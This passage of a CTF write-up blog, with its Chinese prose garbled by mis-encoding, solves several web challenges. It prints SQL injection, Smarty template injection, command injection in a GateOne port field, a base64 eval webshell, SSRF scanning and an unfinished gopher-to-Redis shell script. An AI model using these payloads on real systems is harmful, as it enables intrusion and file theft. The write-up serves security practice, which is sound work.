<ul>
<li>Only fetched images</li>
<li>No JavaScript</li>
<li>No&lt;iframe&gt;</li>
<li>we can use:&lt;img&gt; &lt;embed&gt; &lt;object&gt; &lt;link&gt;</li>
</ul>
<p>æ ¹æ®Yingå¸ˆå‚…çš„wpï¼Œé—®é¢˜åœ¨&lt;link&gt;æ ‡ç­¾ï¼Œåœ¨æ ‡ç­¾å†…hrefåŠ è½½file://`å®ç°SSRF+ä»»æ„æ–‡ä»¶è¯»å–</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"uft-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"attachment"</span> <span class="attr">href</span>=<span class="string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®ï¼Œå°†ä¸‹è½½æ¥çš„pdfæ–‡ä»¶æ”¾å…¥kalié‡Œï¼Œkaliè‡ªå¸¦äº†pdfdetachå·¥å…·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pdfdetach -list 1.pdf</span><br><span class="line">pdfdetach -save 1 1.pdf</span><br></pre></td></tr></table></figure>

<img src="/2020/07/13/FireshellCTF2020/7.png" class="">

<h2 id="Cars"><a href="#Cars" class="headerlink" title="Cars"></a>Cars</h2><p>é¢˜ç›®ç»™äº†apk.zipæ–‡ä»¶ï¼Œä¹‹å‰ä¹Ÿæ²¡ç¢°åˆ°è¿‡è¿™ç§æ–‡ä»¶ï¼Œè¯´å®è¯ä¸ä¼šï¼Œçæ‰¾æ‰¾äº†ä¸‹é‡Œé¢çš„æ–‡ä»¶ï¼Œå€’æ˜¯çœŸçš„æ‰¾åˆ°äº†ç‚¹ä¸œè¥¿ï¼Œæœ‰getå’Œpostæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.arconsultoria.cars.rest</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.Car</span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.Comment</span><br><span class="line"><span class="keyword">import</span> com.arconsultoria.cars.domain.CommentResponse</span><br><span class="line"><span class="keyword">import</span> retrofit2.Call</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.Body</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.GET</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.POST</span><br><span class="line"><span class="keyword">import</span> retrofit2.http.Path</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Rest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GET</span>(<span class="string">"/cars"</span>)</span><br><span class="line">    <span class="function">fun <span class="title">getCars</span><span class="params">()</span>: Call&lt;List&lt;Car&gt;&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    @<span class="title">GET</span><span class="params">(<span class="string">"/car/&#123;id&#125;"</span>)</span></span></span><br><span class="line"><span class="function">    fun <span class="title">getCar</span><span class="params">(@Path(<span class="string">"id"</span>)</span> id: Int): Call&lt;Car&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    @<span class="title">POST</span><span class="params">(<span class="string">"/comment"</span>)</span></span></span><br><span class="line"><span class="function">    fun <span class="title">postComment</span><span class="params">(@Body comment: Comment)</span>: Call&lt;CommentResponse&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure>

<p>åˆ†åˆ«è¿›è¡Œè®¿é—®ï¼Œçœ‹çœ‹è¿”å›çš„æ•°æ®</p>
<img src="/2020/07/13/FireshellCTF2020/8.png" class="">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;carsè¿”å›çš„æ˜¯IDå’Œæœ‰å…³ä¿¡æ¯</span><br><span class="line">&#x2F;car&#x2F;id è¿”å›çš„æ˜¯å•ä¸ªidçš„æ•°æ®ä¿¡æ¯</span><br><span class="line">&#x2F;comment postä¼ å€¼çš„è·¯å¾„</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ‰¾ä¸€ä¸‹æœ‰commentçš„æ–‡ä»¶</p>
<img src="/2020/07/13/FireshellCTF2020/9.png" class="">

<p>è·å¾—äº†ä¸¤ä¸ªå‚æ•°ï¼Œnameå’Œmessage</p>
<img src="/2020/07/13/FireshellCTF2020/10.png" class="">

<p>å¯ä»¥çœ‹åˆ°è¿”å›çš„æ•°æ®æ˜¯jsonçš„å½¢å¼ï¼Œå°è¯•æŠŠæ•°æ®æ”¹ä¸ºjson</p>
<img src="/2020/07/13/FireshellCTF2020/11.png" class="">

<p>ç„¶åæ”¹æˆxmlçš„æ•°æ®å½¢å¼</p>
<img src="/2020/07/13/FireshellCTF2020/12.png" class="">

<p>æˆåŠŸï¼Œé‚£ç”¨xmlæ²¡è·‘äº†</p>
<img src="/2020/07/13/FireshellCTF2020/13.png" class="">

<p>å¯ä»¥çœ‹åˆ°æˆåŠŸè¯»åˆ°äº†/etc/passwd,æ¥ä¸‹æ¥ç›´æ¥è¯»flag</p>
<img src="/2020/07/13/FireshellCTF2020/14.png" class="">]]></content>
      <tags>
        <tag>outboard</tag>
      </tags>
  </entry>
  <entry>
    <title>DAStraining</title>
    <url>/2020/07/07/DAStraining/</url>
    <content><![CDATA[<p>å®‰æ’æš‘å‡åŸ¹è®­çš„æ‘¸åº•ï¼Œè®°å½•ä¸€ä¸‹<a id="more"></a></p>
<h3 id="sql1-0-ç®€å•"><a href="#sql1-0-ç®€å•" class="headerlink" title="sql1.0[ç®€å•]"></a>sql1.0[ç®€å•]</h3><img src="/2020/07/07/DAStraining/1.png" class="">

<p>æ‰“å¼€å°±æ˜¯ä¸€ä¸ªè¿™æ ·çš„ç™»å½•æ¡†ï¼Œå°±æ˜¯sqlæ³¨å…¥ï¼Œæµ‹è¯•çš„æ—¶å€™æ€ä¹ˆæµ‹è¯•éƒ½æ²¡æœ‰ååº”ï¼Œåªä¼šè¯´è®°ä¸‹ä½ çš„æµè§ˆå™¨äº†</p>
<p>åé¢æƒ³åˆ°å¯èƒ½è¯¸å¦‚ç‚¹åœ¨UAä¸­ï¼ŒburpæŠ“åŒ…æµ‹è¯•ä¸€ä¸‹çˆ†å­—æ®µï¼ŒæŠ¥é”™äº†ï¼Œæ‰¾åˆ°æ³¨å…¥ç‚¹</p>
<img src="/2020/07/07/DAStraining/2.png" class="">

<p>æŸ¥æ‰¾ä¸€ä¸‹æŠ¥é”™çš„å†…å®¹ï¼Œæ˜¯insertæ³¨å…¥ï¼Œæ‰¾åˆ°å¯¹åº”çš„sqlæ³¨å…¥è¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">æ³¨æ•°æ®åº“</span><br><span class="line">'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'#  '</span>~<span class="keyword">test</span>~<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ³¨è¡¨</span></span><br><span class="line"><span class="string">'</span><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'test'</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'# '</span>~secert,<span class="keyword">user</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ³¨åˆ—</span></span><br><span class="line"><span class="string"> '</span><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'secert'</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'#  '</span>~secert<span class="string">'</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> æ³¨å­—æ®µå€¼</span></span><br><span class="line"><span class="string">  '</span><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(secert) <span class="keyword">from</span>  test.secert)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'#  ~DASCTF&#123;wfjewhf893uf3ufiwofjoww&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/07/07/DAStraining/3.png" class="">

<h3 id="Dashboard-å›°éš¾"><a href="#Dashboard-å›°éš¾" class="headerlink" title="Dashboard[å›°éš¾]"></a>Dashboard[å›°éš¾]</h3><p>ç™»å½•ç•Œé¢ï¼Œä¸‡èƒ½å¯†ç ç™»å½•ï¼Œå¼€å§‹è¯•äº†å¾ˆå¤šï¼Œå‘ç°and,or,ç©ºæ ¼ç­‰å¾ˆå¤šéƒ½è¢«è¿‡æ»¤äº†</p>
<p>çŒœæµ‹åå°sqlè¯­å¥ä¸º:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;select * from xxx where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$passwd&#39;&quot;;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåœ¨ç”¨æˆ·åå¤„å¯ä»¥ç”¨åæ–œæ è½¬ä¹‰å¼•å·ï¼Œè¿™æ ·å°±èƒ½è®©$passwdé€ƒé€¸å‡ºæ¥</p>
<p>admin\  ||1#å°±èƒ½æˆåŠŸç™»å½•äº†</p>
<p>åœ¨Dashboardé¡µé¢æœ‰ä¸€ä¸ªä¸ªäººä¿¡æ¯ä¿®æ”¹é¡µé¢ï¼Œå¡«ä¸€ä¸‹æŠ“ä¸ªåŒ…</p>
<p>æ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªå›æ˜¾å¾ˆåƒæ¨¡æ¿æ³¨å…¥ï¼ŒæŠŠæ”¶é›†çš„æ¨¡æ¿æ³¨å…¥çš„paylaodæŒ¨ä¸ªè¯•è¯•ï¼Œæ˜¯smartyæ¨¡æ¿æ³¨å…¥ï¼Œåœ¨nameå¤„ï¼Œè¿™é‡Œè¿‡æ»¤äº†æŒºå¤šï¼Œä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œå¯èƒ½è¦RCEäº†ï¼Œå…ˆæ¥è¯•è¯•</p>
<img src="/2020/07/07/DAStraining/8.png" class="">

<p>å¯ä»¥çœ‹åˆ°flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œä½†æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œä¸çŸ¥é“æ€ä¹ˆè¯»å–ï¼Œæ„Ÿè§‰è·Ÿä¸Šæ¬¡GXYçš„ç¦æ­¢å¥—å¨ƒæœ‰ç‚¹å·®åˆ«ï¼Œè¯•è¯•æ„é€ ä¸€ä¸‹å¥½äº†</p>
<p>2333ï¼Œæœç„¶ä¸è¡Œ</p>
<p>è¿™é‡Œè¦è¡¥å……ç‚¹çŸ¥è¯†ç‚¹äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_slice() å‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›</span><br><span class="line">get_defined_vars()æ­¤å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</span><br><span class="line">array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­çš„é”®åå’Œå¯¹åº”å…³è”çš„é”®å€¼</span><br><span class="line">array_rand() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®å</span><br><span class="line">getallheaders()æ­¤å‡½æ•°ä¼ å›ç°è¡Œçš„è¯·æ±‚çš„æ‰€æœ‰HTTPæ ‡å¤´ï¼Œä¼ å›å€¼æ˜¯ä¸€æ•°ç»„å½¢æ€</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¸€æ¥å°±èƒ½æ„é€ äº†ï¼Œarray_rand()å’Œarray_flip()ä¸€èµ·ç”¨ï¼Œè¿™é‡Œè¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¸¦æœ‰fileçš„éƒ½è¢«banäº†ï¼Œä¹Ÿå°±æ˜¯fgets()ã€readfile()ã€file_get_contents()ã€highlight_file()éƒ½ä¸èƒ½ç”¨ï¼Œä¸è¿‡è¿˜æœ‰ä¸€ä¸ªshow_resource()å‡½æ•°èƒ½ç”¨ï¼ŒåŠŸèƒ½ç±»ä¼¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.&#123;if show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))))))&#125;&#123;&#x2F;if&#125;#è¿™ä¸ªå¤ªé è¿æ°”äº†ï¼Œè¦åˆ·å¥½å¤šæ¬¡ï¼Œæˆ‘æ˜¯æ²¡æœ‰åˆ·å‡ºæ¥</span><br><span class="line">2.&#123;if show_source(current(array_slice(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))),7)))&#125;&#123;&#x2F;if&#125;#è¿™ä¸ªå°±æ¯”è¾ƒå¥½ç†è§£äº†</span><br><span class="line">3.æ·»åŠ å¤´å­—æ®µa:&#x2F;flag</span><br><span class="line">&#123;if show_source(end(getallheaders()))&#125;&#123;&#x2F;if&#125;#è¿™ç§ä¹Ÿæ¯”è¾ƒå¥½ç†è§£ï¼Œaéšä¾¿æ”¹æˆä»€ä¹ˆéƒ½å¯ä»¥</span><br></pre></td></tr></table></figure>

<p>é™„ä¸Šä¸€å¼ ç¬¬äºŒç§æ–¹æ³•è¯»å–çš„å›¾ç‰‡</p>
<img src="/2020/07/07/DAStraining/9.png" class="">

<h3 id="NiuShop-ç®€å•"><a href="#NiuShop-ç®€å•" class="headerlink" title="NiuShop[ç®€å•]"></a>NiuShop[ç®€å•]</h3><p>é¡µé¢æç¤ºæ˜¯thinkphp5.0ï¼Œå¼€å§‹ä»¥ä¸ºè¦åå°ç™»å½•ï¼Œadmin/adminç›´æ¥ç™»ä¸Šäº†ï¼Œè¿˜ç‰¹åœ°å»æ‰¾äº†åå°ç™»å½•getshellçš„æ–‡ç« ï¼Œåæ¥å‘ç°æ‰“ä¸é€š</p>
<p>å›è¿‡æ¥è¯•äº†ä¸€ä¸‹thinkphp5.0çš„é“¾å­ï¼Œé€šäº†23333</p>
<p>çœ‹ä¸€ä¸‹æ ¹ç›®å½•æœ‰å“ªäº›æ–‡ä»¶</p>
<img src="/2020/07/07/DAStraining/4.png" class="">

<p>ç›´æ¥è¯»å–flagæ–‡ä»¶</p>
<img src="/2020/07/07/DAStraining/5.png" class="">

<p>åé¢è¦æŠ“ç´§æ—¶é—´æŠŠthinkphpæ¯ä¸ªç‰ˆæœ¬çš„é“¾å­éƒ½è¿‡ä¸€é2333</p>
<h3 id="GateOne-ä¸­ç­‰"><a href="#GateOne-ä¸­ç­‰" class="headerlink" title="GateOne[ä¸­ç­‰]"></a>GateOne[ä¸­ç­‰]</h3><p>æ‰“å¼€é¢˜æ˜¯ä¸ªç±»ä¼¼äºxshellçš„é¡µé¢ï¼Œæ— ä»ä¸‹æ‰‹ï¼Œä»æ²¡æœ‰é‡åˆ°è¿‡çš„é¢˜ç›®ï¼Œæ‰¾æ‰¾ç›¸å…³çš„èµ„æ–™å§</p>
<p>èµµæ€»è¿˜æ˜¯tqläº†ï¼Œåœ¨GitHubä¸Šæ‰¾åˆ°äº†èµµæ€»çš„è¿™ç¯‡æ–‡ç« <a href="https://github.com/liftoff/GateOne/issues/736?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://github.com/liftoff/GateOne/issues/736?tdsourcetag=s_pctim_aiomsg</a></p>
<p>ç®€å•çš„æ¥è¯´å°±æ˜¯åœ¨ç™»å½•ç­‰å¾…çš„æ—¶å€™æ‰§è¡Œterminalï¼šssh_get_host_fingerprintâ€™å‘½ä»¤ï¼Œbuuä¸Šå¼€å°æœºå­</p>
<p>ç›´æ¥ç”¨æ–‡ç« é‡Œçš„payloadæ‰“ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GateOne.ws.send(&#39;&#123;&quot;terminal:ssh_get_host_fingerprint&quot;:&#123;&quot;host&quot;:&quot;node3.buuoj.cn&quot;,&quot;port&quot;:&quot;29876;cat &#x2F;etc&#x2F;passwd;&quot;&#125;&#125;&#39;)</span><br></pre></td></tr></table></figure>

<img src="/2020/07/07/DAStraining/6.png" class="">

<p>åœ¨é¡µé¢çš„æŠ¥é”™ä¿¡æ¯ä¸­æˆåŠŸè¯»åˆ°äº†å†…å®¹ï¼Œä¸‹é¢ç›´æ¥æ¥è¯»flagå§</p>
<img src="/2020/07/07/DAStraining/7.png" class="">

<h3 id="icms-ç®€å•"><a href="#icms-ç®€å•" class="headerlink" title="icms[ç®€å•]"></a>icms[ç®€å•]</h3>]]></content>
      <tags>
        <tag>DAS</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF</title>
    <url>/2020/05/24/GKCTF/</url>
    <content><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>å‰è¨€ï¼š</p>
<a id="more"></a>

<p>è¿™æ¬¡æ¯”èµ›å¯ä»¥è¯´æ‰“çš„æŒºç³Ÿç³•å§ï¼Œæ²¡æœ‰åšå‡ºæ¥çš„webï¼Œè¿˜æ˜¯ç§¯ç´¯çš„ä¸å¤Ÿï¼Œåšçš„é¢˜ä¸å¤Ÿå¤šï¼Œä»éœ€åŠªåŠ›å•Šï¼ä¸‹é¢æ˜¯èµ›åå¤ç°ï¼Œä¸å¤šè¯´ï¼Œå¼€æ•´ï¼</p>
<h4 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h4><p>å¼€é¢˜ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡ä»£ç ,ç»™Ginkgoä»¥GETæˆ–è€…POSTçš„æ–¹å¼ä¼ é€’base64åŠ å¯†è¿‡çš„è¯­å¥ï¼Œä¼šé€šè¿‡evalæ‰“å°å‡ºæ¥ï¼Œå°±æˆäº†phpä¸­å¯æ‰§è¡Œçš„è¯­å¥ï¼Œé€šè¿‡è¿™ä¸ªæ–¹æ³•å¯ä»¥å†™å…¥ä¸€å¥è¯getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?Ginkgo&#x3D;ZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x3D;</span><br></pre></td></tr></table></figure>

<img src="/2020/05/24/GKCTF/1.png" class="">

<p>å¯ä»¥çœ‹åˆ°disable_functionä¸­ç¦ç”¨äº†å¾ˆå¤šæ‰§è¡Œå‡½æ•°ï¼Œè·Ÿä¹‹å‰çš„ä¸€é“RCEMEå¾ˆåƒï¼Œèšå‰‘è¿ä¸€ä¸‹ï¼Œæ ¹ç›®å½•ä¸‹æœ‰flagå’Œreadflagï¼Œä½†æ˜¯ä¸èƒ½è¯»ï¼Œå°è¯•ç”¨æ’ä»¶ç»•è¿‡ï¼Œæ²¡æœ‰ç”¨</p>
<p>æ‰¾åˆ«çš„å¸ˆå‚…æ‹¿äº†ä¸€ä¸ªç»•php7.3disable_functionçš„æ–‡ä»¶(ps:æ¯”èµ›æ‰¾èµ„æ–™çš„èƒ½åŠ›å¤ªèœäº†23333)</p>
<p>å¯ä»¥æŠŠé‚£ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°tmpç›®å½•ä¸‹ï¼ˆtmpç›®å½•æ˜¯å¯ä¼ çš„ï¼Œä¹‹å‰å¹¶ä¸çŸ¥é“ï¼Œå¤ªèœï¼‰</p>
<p>ç„¶åå†åŒ…å«ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æ‰€åœ¨è·¯å¾„ï¼Œgetåˆ°flag</p>
<img src="/2020/05/24/GKCTF/2.png" class="">



<h4 id="GKCTF2020-è€å…«å°è¶…å¸‚å„¿"><a href="#GKCTF2020-è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="[GKCTF2020]è€å…«å°è¶…å¸‚å„¿"></a>[GKCTF2020]è€å…«å°è¶…å¸‚å„¿</h4><p>æ‰“å¼€æ˜¯shopxoå•†åŸï¼Œgoogleä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« è®²shopxoåå°è·å–shellçš„æ–‡ç« [é™„ä¸Šé“¾æ¥ï¼š<a href="http://www.nctry.com/1660.html]" target="_blank" rel="noopener">http://www.nctry.com/1660.html]</a></p>
<p>è®¿é—®admin.phpé¡µé¢ï¼Œé»˜è®¤ç™»å½•ç”¨æˆ·åå’Œå¯†ç æ˜¯adminå’Œshopxo</p>
<p>åœ¨åå°ä¸‹è½½é»˜è®¤ä¸»é¢˜ï¼ŒæŠŠè‡ªå·±çš„ğŸæ”¾åœ¨default_static_ ç›®å½•ä¸‹ï¼Œå†åœ¨åå°æ‰¾åˆ°ç½‘ç«™ç®¡ç†-ä¸»é¢˜ç®¡ç†-ä¸»é¢˜å®‰è£…ï¼Œshellå°±æˆåŠŸä¸Šä¼ äº†ï¼Œè®¿é—®åœ°å€ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;xxx.php</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æœ‰flagå’Œreadflagï¼Œå¾—åˆ°æç¤º</p>
<p>true_flag_in_/root</p>
<p>å…ˆçœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œpa aux(æœ‰æ—¶é—´æ€»ç»“ä¸€ä¸‹linuxä¸€äº›ä¸ç†Ÿæ‚‰çš„å‘½ä»¤)</p>
<p>è¯»å–ä¸€ä¸‹auto.sh,å‘ç°pyæ–‡ä»¶ï¼Œè¯»å–</p>
<img src="/2020/05/24/GKCTF/3.png" class="">

<p>è¿™ä¸ªpythonæ–‡ä»¶ä¼šæŠŠæŸäº›å†…å®¹å†™å…¥åˆ°flag.hintä¸­ï¼Œæˆ‘ä»¬åªè¦ä¿®æ”¹ä¸€ä¸‹å°±èƒ½æ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">"\nGet The RooT,The Date Is Useful!"</span></span><br><span class="line">f=io.open(<span class="string">"/flag.hint"</span>, <span class="string">"rb+"</span>)</span><br><span class="line">s=os.popen(<span class="string">'cat /root/flag'</span>).read()</span><br><span class="line">f.write(str(s))</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>ç­‰å¾…60sï¼Œåœ¨flag.hintæ‰¾åˆ°flag</p>
<h4 id="GKCTF2020-cveç‰ˆç­¾åˆ°"><a href="#GKCTF2020-cveç‰ˆç­¾åˆ°" class="headerlink" title="[GKCTF2020]cveç‰ˆç­¾åˆ°"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h4><p>æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å‡»ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ ¹æ®hintï¼Œcve-2020-7066ï¼Œgoogleï¼Œå‘ç°è¿™ä¸ªæ¼æ´ç”¨çš„å°±æ˜¯%00æˆªæ–­ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…è¯´å’Œæ˜¨å¤©bjdçš„è€ƒç‚¹ç±»ä¼¼ï¼Œå¯æƒœä¹Ÿæ²¡åšå‡ºæ¥ï¼Œä¿®æ”¹ä¸€ä¸‹è®¿é—®çš„url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure>

<img src="/2020/05/24/GKCTF/4.png" class="">

<p>è¿™é‡Œæœ‰æç¤ºï¼Œhostå¿…é¡»è¦end with 123</p>
<p>ç»§ç»­ä¿®æ”¹ï¼Œå¾—åˆ°flag</p>
<img src="/2020/05/24/GKCTF/5.png" class="">

<h4 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzWeb"><a href="#GKCTF2020-EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb"></a>[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb</h4><p>å¼€é¢˜ï¼Œåœ¨é¡µé¢æºç å¤„æ‰¾åˆ°æç¤ºï¼Œè®¿é—®?secret</p>
<img src="/2020/05/24/GKCTF/6.png" class="">

<p>å¯ä»¥çœ‹åˆ°addræ˜¯173.235.107.10,ssrfæ¢æµ‹å†…ç½‘ï¼Œå†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">ip = <span class="string">'173.235.107.&#123;&#125;'</span></span><br><span class="line">url = <span class="string">'http://99f58bf3-0950-499e-9f50-cdeeb37d306d.node3.buuoj.cn'</span></span><br><span class="line">temp = <span class="string">"&#123;0&#125;/index.php?url=&#123;1&#125;&amp;submit=%E6%8F%90%E4%BA%A4"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.content) != <span class="number">445</span>:</span><br><span class="line">        print(i)</span><br><span class="line">//è·‘å‡ºæ¥çš„ç»“æœä¸å”¯ä¸€ï¼ŒæŒ¨ä¸ªè¯•ä¸€ä¸‹ï¼Œè¯•å‡ºæ¥æ˜¯<span class="number">11</span></span><br></pre></td></tr></table></figure>

<p>æäº¤ï¼Œæç¤ºç«¯å£ï¼Œå¯ä»¥ç”¨è„šæœ¬æ¥è·‘ï¼Œä¹Ÿå¯ä»¥ç”¨burpï¼Œç«¯å£æ˜¯6379</p>
<p>redis</p>
<p>æ„é€ gophar:getshellè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line"></span><br><span class="line">ip=<span class="string">"173.235.107.11"</span></span><br><span class="line"></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php system(\"cat /flag\");?&gt;\n\n"</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line"></span><br><span class="line">path=<span 